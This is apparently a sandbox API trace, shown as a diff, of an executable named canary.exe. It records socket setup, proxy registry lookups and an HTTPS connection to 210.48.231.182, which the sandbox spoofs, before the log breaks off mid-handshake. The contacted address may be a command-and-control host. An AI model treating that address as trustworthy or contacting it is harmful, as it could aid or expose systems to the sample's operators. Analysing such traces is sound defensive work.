@@ -1,0 +1,2561 @@
+Creation de Processus, pid [0x784] (C:\Users\user\Desktop\quiet_canary\canary.exe)
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x790]
+
+
+********** Dumping PEB64 **********
+
+	Path : C:\Users\user\Desktop\quiet_canary\canary.exe
+	Base : 0x000000263FBF0000
+	Size : 0xa000
+
+	Path : C:\Windows\SYSTEM32\ntdll.dll
+	Base : 0x00007FFA424C0000
+	Size : 0x1ac000
+
+	Path : C:\Windows\SYSTEM32\MSCOREE.DLL
+	Base : 0x00007FFA34B20000
+	Size : 0x64000
+
+	Path : C:\Windows\system32\KERNEL32.dll
+	Base : 0x00007FFA3FB50000
+	Size : 0x13e000
+
+	Path : C:\Windows\system32\KERNELBASE.dll
+	Base : 0x00007FFA3F910000
+	Size : 0x115000
+
+	Path : C:\Windows\system32\ADVAPI32.dll
+	Base : 0x00007FFA41F80000
+	Size : 0xaa000
+
+	Path : C:\Windows\system32\msvcrt.dll
+	Base : 0x00007FFA418D0000
+	Size : 0xaa000
+
+	Path : C:\Windows\SYSTEM32\sechost.dll
+	Base : 0x00007FFA414D0000
+	Size : 0x59000
+
+	Path : C:\Windows\system32\RPCRT4.dll
+	Base : 0x00007FFA41380000
+	Size : 0x141000
+
+	Path : C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll
+	Base : 0x00007FFA33B20000
+	Size : 0x9d000
+
+********** End Dump PEB64 **********
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x668]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0xbe4]
+
+[CNT] [1]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryPerformanceFrequency> in [KERNEL32.dll] 
+[PAR] LARGE_INTEGER *lpFrequency : 0x00007FF9CE3855B8
+[RET] 0x7ffa2bbfd3f0 in [System.ni.dll]
+
+[CNT] [2]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <QueryPerformanceCounter> in [KERNEL32.dll] 
+[RET] 0x7ffa2bbfd3f0 in [System.ni.dll]
+
+[CNT] [3]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RasEnumConnectionsW> in [rasapi32.dll] 
+[PAR] LPRASCONNW unnammedParam1 : 0x000000263FE0D880
+[PAR] LPDWORD    unnammedParam2 : 0x000000263FD2E504
+[PAR] LPDWORD    unnammedParam2 : 0x000000263FD2E500
+[RET] 0x7ffa2bc05244 in [System.ni.dll]
+
+[CNT] [4]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAStartup> in [WS2_32.dll] 
+[PAR] WORD wVersionRequested : 0x202
+[RET] 0x7ffa2bbfc6c2 in [System.ni.dll]
+
+[CNT] [5]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x0
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [6]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x2c4
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x80 (SO_LINGER)
+[PAR] char   *optval : 0x000000263FD2DFC0
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bbfc998 in [System.ni.dll]
+
+[CNT] [7]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x2c4
+[RET] 0x7ffa2bbfcbf8 in [System.ni.dll]
+
+[CNT] [8]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x0
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [9]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <setsockopt> in [WS2_32.dll] 
+[PAR] SOCKET s       : 0x2c4
+[PAR] int    level   : 0xffff (SOL_SOCKET)
+[PAR] int    optname : 0x80 (SO_LINGER)
+[PAR] char   *optval : 0x000000263FD2DFC0
+[PAR] int    optlen  : 0x4
+[RET] 0x7ffa2bbfc998 in [System.ni.dll]
+
+[CNT] [10]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x2c4
+[RET] 0x7ffa2bbfcbf8 in [System.ni.dll]
+
+[CNT] [11]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [12]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x2c4
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x000000263FD2E500
+[FLD]        -> *argp = 0xffffffff (enable non-blocking mode)
+[RET] 0x7ffa2bbfccf6 in [System.ni.dll]
+
+[CNT] [13]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [14]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x2cc
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x000000263FD2E500
+[FLD]        -> *argp = 0xffffffff (enable non-blocking mode)
+[RET] 0x7ffa2bbfccf6 in [System.ni.dll]
+
+[CNT] [15]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAIoctl> in [WS2_32.dll] 
+[PAR] SOCKET  s                 : 0x2c4
+[PAR] DWORD   dwIoControlCode   : 0x28000017 (SIO_ADDRESS_LIST_CHANGE)
+[PAR] LPVOID  lpvInBuffer       : 0x0
+[PAR] DWORD   cbInBuffer        : 0x0
+[PAR] LPVOID  lpvOutBuffer      : 0x0
+[PAR] LPDWORD lpcbBytesReturned : 0x0
+[RET] 0x7ffa2bbfced4 in [System.ni.dll]
+
+[CNT] [16]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <FormatMessageW> in [KERNEL32.dll] 
+[PAR] DWORD    dwFlags      : 0x3200
+[PAR] LPCVOID  lpSource     : 0x0
+[PAR] DWORD    dwMessageId  : 0x2733
+[PAR] DWORD    dwLanguageId : 0x0
+[PAR] LPWSTR   lpBuffer     : 0x000000263FD2E0B0
+[PAR] DWORD    nSize        : 0x101
+[PAR] va_list* Arguments    : 0x0
+[RET] 0x7ffa2bbfd17b in [System.ni.dll]
+
+[CNT] [17]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAEventSelect> in [WS2_32.dll] 
+[PAR] SOCKET   s              : 0x2c4
+[PAR] WSAEVENT hEventObject   : 0x2c8
+[PAR] long     lNetworkEvents : 0x200 (FD_ADDRESS_LIST_CHANGE_BIT)
+[RET] 0x7ffa2bbfd2fb in [System.ni.dll]
+
+[CNT] [18]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAIoctl> in [WS2_32.dll] 
+[PAR] SOCKET  s                 : 0x2cc
+[PAR] DWORD   dwIoControlCode   : 0x28000017 (SIO_ADDRESS_LIST_CHANGE)
+[PAR] LPVOID  lpvInBuffer       : 0x0
+[PAR] DWORD   cbInBuffer        : 0x0
+[PAR] LPVOID  lpvOutBuffer      : 0x0
+[PAR] LPDWORD lpcbBytesReturned : 0x0
+[RET] 0x7ffa2bbfced4 in [System.ni.dll]
+
+[CNT] [19]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <FormatMessageW> in [KERNEL32.dll] 
+[PAR] DWORD    dwFlags      : 0x3200
+[PAR] LPCVOID  lpSource     : 0x0
+[PAR] DWORD    dwMessageId  : 0x2733
+[PAR] DWORD    dwLanguageId : 0x0
+[PAR] LPWSTR   lpBuffer     : 0x000000263FD2E0B0
+[PAR] DWORD    nSize        : 0x101
+[PAR] va_list* Arguments    : 0x0
+[RET] 0x7ffa2bbfd17b in [System.ni.dll]
+
+[CNT] [20]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAEventSelect> in [WS2_32.dll] 
+[PAR] SOCKET   s              : 0x2cc
+[PAR] WSAEVENT hEventObject   : 0x2d0
+[PAR] long     lNetworkEvents : 0x200 (FD_ADDRESS_LIST_CHANGE_BIT)
+[RET] 0x7ffa2bbfd2fb in [System.ni.dll]
+
+[CNT] [21]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RasConnectionNotificationW> in [rasapi32.dll] 
+[PAR] HRASCONN unnammedParam1 : 0xFFFFFFFFFFFFFFFF
+[PAR] HANDLE   unnammedParam2 : 0x2d4
+[PAR] DWORD    unnammedParam3 : 0x3 (RASCN_Connection | RASCN_Disconnection)
+[RET] 0x7ffa2bc053c7 in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x938]
+
+[CNT] [22]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegOpenCurrentUser> in [ADVAPI32.dll] 
+[PAR] REGSAM samDesired : 0x20019 (KEY_READ)
+[PAR] PHKEY  phkResult  : 0x000000263FD2E528
+[RET] 0x7ffa2bc054fb in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x98c]
+
+[CNT] [23]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x2ec 
+[PAR] LPCWSTR lpSubKey  : 0x0000002641944884
+[STR]         -> "SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
+[PAR] DWORD   ulOptions : 0x0
+[RET] 0x7ffa2bc056d0 in [System.ni.dll]
+
+[CNT] [24]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegNotifyChangeKeyValue> in [ADVAPI32.dll] 
+[PAR] HKEY   hKey           : 0x310
+[PAR] BOOL   bWatchSubTree  : 0x1
+[PAR] DWORD  dwNotifyFilter : 0x4
+[PAR] HANDLE hEvent         : 0x2fc
+[PAR] BOOL   fAsynchonous   : 0x1
+[RET] 0x7ffa2bc05861 in [System.ni.dll]
+
+[CNT] [25]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCWSTR lpSubKey  : 0x0000002641944884
+[STR]         -> "SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"
+[PAR] DWORD   ulOptions : 0x0
+[RET] 0x7ffa2bc05a1a in [System.ni.dll]
+
+[CNT] [26]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegNotifyChangeKeyValue> in [ADVAPI32.dll] 
+[PAR] HKEY   hKey           : 0x318
+[PAR] BOOL   bWatchSubTree  : 0x1
+[PAR] DWORD  dwNotifyFilter : 0x4
+[PAR] HANDLE hEvent         : 0x31c
+[PAR] BOOL   fAsynchonous   : 0x1
+[RET] 0x7ffa2bc05861 in [System.ni.dll]
+
+[CNT] [27]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegOpenKeyExW> in [ADVAPI32.dll] 
+[PAR] HKEY    hKey      : 0x80000002 (HKEY_LOCAL_MACHINE)
+[PAR] LPCWSTR lpSubKey  : 0x000000264194492C
+[STR]         -> "SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\Internet Settings"
+[PAR] DWORD   ulOptions : 0x0
+[RET] 0x7ffa2bc05a1a in [System.ni.dll]
+
+[CNT] [28]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <RegNotifyChangeKeyValue> in [ADVAPI32.dll] 
+[PAR] HKEY   hKey           : 0x320
+[PAR] BOOL   bWatchSubTree  : 0x1
+[PAR] DWORD  dwNotifyFilter : 0x4
+[PAR] HANDLE hEvent         : 0x324
+[PAR] BOOL   fAsynchonous   : 0x1
+[RET] 0x7ffa2bc05861 in [System.ni.dll]
+
+[CNT] [29]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WinHttpOpen> in [winhttp.dll] 
+[PAR] LPCWSTR pwszUserAgent   : 0x0 (null)
+[PAR] DWORD   dwAccessType    : 0x1 (INTERNET_OPEN_TYPE_DIRECT)
+[PAR] LPCWSTR pwszProxyName   : 0x0 (null)
+[PAR] LPCWSTR pwszProxyBypass : 0x0 (null)
+[PAR] DWORD   dwFlags         : 0x0
+[RET] 0x7ffa2bc05be6 in [System.ni.dll]
+
+[CNT] [30]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WinHttpSetTimeouts> in [winhttp.dll] 
+[PAR] HINTERNET hConnect          : 0x3fe180a0
+[PAR] int       nResolveTimeout   : 0xea60
+[PAR] int       nConnectTimeout   : 0xea60
+[PAR] int       nSendTimeout      : 0xea60
+[PAR] int       nReceiveTimeout   : 0xea60
+[RET] 0x7ffa2bc05d01 in [System.ni.dll]
+
+[CNT] [31]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WinHttpGetIEProxyConfigForCurrentUser> in [winhttp.dll] 
+[PAR] WINHTTP_CURRENT_USER_IE_PROXY_CONFIG *pProxyConfig : 0x000000263FD2E4C8
+[RET] 0x7ffa2bc05ea8 in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x1f0]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x954]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0xbc0]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x888]
+
+[CNT] [32]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WinHttpGetProxyForUrl> in [winhttp.dll] 
+[PAR] HINTERNET                 hRequest           : 0x3fe180a0
+[PAR] LPCWSTR                   lpcwszUrl          : 0x000000264194B67C
+[STR]                           -> "https://210.48.231.182/"
+[PAR] WINHTTP_AUTOPROXY_OPTIONS *pAutoProxyOptions : 0x000000263FD2E308
+[PAR] WINHTTP_PROXY_INFO        *pProxyInfo        : 0x000000263FD2E408
+[RET] 0x7ffa2bbff691 in [System.ni.dll]
+
+Thread created by monitored process : Now monitoring [pid 0x784][tid 0x3cc]
+
+[CNT] [33]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [34]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3e0
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x000000263FD2E5B0
+[FLD]        -> *argp = 0xffffffff (enable non-blocking mode)
+[RET] 0x7ffa2bbfccf6 in [System.ni.dll]
+
+[CNT] [35]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int                type           : 0x2 (SOCK_DGRAM)
+[PAR] int                protocol       : 0x0 (NOT_SPECIFIED)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [36]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <ioctlsocket> in [WS2_32.dll] 
+[PAR] SOCKET s    : 0x3cc
+[PAR] LONG   cmd  : 0x8004667e (FIONBIO)
+[PAR] PULONG argp : 0x000000263FD2E5B0
+[FLD]        -> *argp = 0xffffffff (enable non-blocking mode)
+[RET] 0x7ffa2bbfccf6 in [System.ni.dll]
+
+[CNT] [37]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAIoctl> in [WS2_32.dll] 
+[PAR] SOCKET  s                 : 0x3e0
+[PAR] DWORD   dwIoControlCode   : 0x28000017 (SIO_ADDRESS_LIST_CHANGE)
+[PAR] LPVOID  lpvInBuffer       : 0x0
+[PAR] DWORD   cbInBuffer        : 0x0
+[PAR] LPVOID  lpvOutBuffer      : 0x0
+[PAR] LPDWORD lpcbBytesReturned : 0x0
+[RET] 0x7ffa2bbfced4 in [System.ni.dll]
+
+[CNT] [38]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <FormatMessageW> in [KERNEL32.dll] 
+[PAR] DWORD    dwFlags      : 0x3200
+[PAR] LPCVOID  lpSource     : 0x0
+[PAR] DWORD    dwMessageId  : 0x2733
+[PAR] DWORD    dwLanguageId : 0x0
+[PAR] LPWSTR   lpBuffer     : 0x000000263FD2E160
+[PAR] DWORD    nSize        : 0x101
+[PAR] va_list* Arguments    : 0x0
+[RET] 0x7ffa2bbfd17b in [System.ni.dll]
+
+[CNT] [39]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAEventSelect> in [WS2_32.dll] 
+[PAR] SOCKET   s              : 0x3e0
+[PAR] WSAEVENT hEventObject   : 0x3d4
+[PAR] long     lNetworkEvents : 0x200 (FD_ADDRESS_LIST_CHANGE_BIT)
+[RET] 0x7ffa2bbfd2fb in [System.ni.dll]
+
+[CNT] [40]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAIoctl> in [WS2_32.dll] 
+[PAR] SOCKET  s                 : 0x3cc
+[PAR] DWORD   dwIoControlCode   : 0x28000017 (SIO_ADDRESS_LIST_CHANGE)
+[PAR] LPVOID  lpvInBuffer       : 0x0
+[PAR] DWORD   cbInBuffer        : 0x0
+[PAR] LPVOID  lpvOutBuffer      : 0x0
+[PAR] LPDWORD lpcbBytesReturned : 0x0
+[RET] 0x7ffa2bbfced4 in [System.ni.dll]
+
+[CNT] [41]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <FormatMessageW> in [KERNEL32.dll] 
+[PAR] DWORD    dwFlags      : 0x3200
+[PAR] LPCVOID  lpSource     : 0x0
+[PAR] DWORD    dwMessageId  : 0x2733
+[PAR] DWORD    dwLanguageId : 0x0
+[PAR] LPWSTR   lpBuffer     : 0x000000263FD2E160
+[PAR] DWORD    nSize        : 0x101
+[PAR] va_list* Arguments    : 0x0
+[RET] 0x7ffa2bbfd17b in [System.ni.dll]
+
+[CNT] [42]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAEventSelect> in [WS2_32.dll] 
+[PAR] SOCKET   s              : 0x3cc
+[PAR] WSAEVENT hEventObject   : 0x3b8
+[PAR] long     lNetworkEvents : 0x200 (FD_ADDRESS_LIST_CHANGE_BIT)
+[RET] 0x7ffa2bbfd2fb in [System.ni.dll]
+
+[CNT] [43]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <GetAdaptersAddresses> in [IPHLPAPI.DLL] 
+[PAR] ULONG                 Family           : 0x0
+[PAR] ULONG                 Flags            : 0x2e (GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_FRIENDLY_NAME)
+[PAR] PVOID                 Reserved         : 0x0
+[PAR] PIP_ADAPTER_ADDRESSES AdapterAddresses : 0x0
+[PAR] PULONG                SizePointer      : 0x000000263FD2E590
+[RET] 0x7ffa2bc0626a in [System.ni.dll]
+
+[CNT] [44]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <LocalAlloc> in [KERNEL32.dll] 
+[PAR] UINT   uFlags : 0x0
+[PAR] SIZE_T uBytes : 0x900
+[RET] 0x7ffa2bc050bf in [System.ni.dll]
+
+[CNT] [45]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <GetAdaptersAddresses> in [IPHLPAPI.DLL] 
+[PAR] ULONG                 Family           : 0x0
+[PAR] ULONG                 Flags            : 0x2e (GAA_FLAG_SKIP_ANYCAST | GAA_FLAG_SKIP_MULTICAST | GAA_FLAG_SKIP_DNS_SERVER | GAA_FLAG_SKIP_FRIENDLY_NAME)
+[PAR] PVOID                 Reserved         : 0x0
+[PAR] PIP_ADAPTER_ADDRESSES AdapterAddresses : 0x000000263FE43840
+[PAR] PULONG                SizePointer      : 0x000000263FD2E590
+[RET] 0x7ffa2bc0626a in [System.ni.dll]
+
+[CNT] [46]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <LocalFree> in [KERNEL32.dll] 
+[RET] 0x7ffa2bc04ec8 in [System.ni.dll]
+
+[CNT] [47]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x2 (AF_INET) (IPv4)
+[PAR] int                type           : 0x1 (SOCK_STREAM)
+[PAR] int                protocol       : 0x6 (IPPROTO_TCP)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[CNT] [48]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSASocketW> in [WS2_32.dll] 
+[PAR] int                address_family : 0x17 (AF_INET6) (IPv6)
+[PAR] int                type           : 0x1 (SOCK_STREAM)
+[PAR] int                protocol       : 0x6 (IPPROTO_TCP)
+[PAR] LPWSAPROTOCOL_INFO lpProtocolInfo : 0x0
+[PAR] GROUP              g              : 0x0
+[PAR] DWORD              dwFlags        : 0x1
+[RET] 0x7ffa2bbfc89b in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[EVT] [Dynamic Network analysis]
+[MSG] Spoofing IP 210.48.231.182 with IP 169.254.143.43
+
+[CNT] [49]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <WSAConnect> in [WS2_32.dll] 
+[PAR] SOCKET   s     : 0x3d0
+[PAR] sockaddr *name : 0x00000026419546A8
+[FLD]          -> sin_family   : 2 (IPv4)
+[FLD]          -> sin_port     : 47873 (Little endian : 443)
+[FLD]          -> sin_addr     : 210.48.231.182
+[RET] 0x7ffa2bc03542 in [System.ni.dll]
+
+[CNT] [50]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <closesocket> in [WS2_32.dll] 
+[PAR] SOCKET       s : 0x3f4
+[RET] 0x7ffa2bbfcbf8 in [System.ni.dll]
+
+[CNT] [51]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <AcquireCredentialsHandleW> in [SSPICLI.DLL] 
+[PAR] LPWSTR         pszPrincipal     : 0x0 (null)
+[PAR] LPWSTR         pszPackage       : 0x0000002641955794
+[STR]                -> "Microsoft Unified Security Protocol Provider"
+[PAR] unsigned long  fCredentialUse   : 0x2 (SECPKG_CRED_OUTBOUND)
+[PAR] void*          pvLogonId        : 0x0
+[PAR] void*          pAuthData        : 0x000000263FD2DC80
+[FLD]                -> Type : 4 (CredsspSchannelCreds)
+[FLD]                -> pSchannelCred = 0x0
+[FLD]                -> pSpnegoCred   = 0x0
+[PAR] SEC_GET_KEY_FN pGetKeyFn        : 0x0
+[PAR] void*          pvGetKeyArgument : 0x0
+[PAR] PCredHandle    phCredential     : 0x0000002641957790
+[PAR] PTimeStamp     ptsExpiry        : 0x000000263FD2DA80
+[RET] 0x7ffa2bc0698c in [System.ni.dll]
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[API] <AcquireCredentialsHandleW>
+[RES] SECURITY_STATUS 0x0 (SEC_E_OK)
+
+[ * ] [pid 0x784][tid 0x790] c:\users\user\desktop\quiet_canary\canary.exe
+[EVT] [Dynamic Network analysis]
+[MSG] Spoofing IP 210.48.231.182 with IP 169.254.143.43
+
+[CNT] [52]
+[PTP] [0x784] [0x790] [c:\users\user\desktop\quiet_canary\canary.exe]
+[INF] [ Called from Native Image DLL ]
+[API] <InitializeSecurityContextW> in [SSPICLI.DLL] 
+[PAR] PCredHandle    phCredential  : 0x000000263FD2DBF8
+[PAR] PCtxtHandle    phContext     : 0x0
+[PAR] WCHAR*         pszTargetName : 0x0000002641938D6C
+[STR]                -> "210.48.231.182"
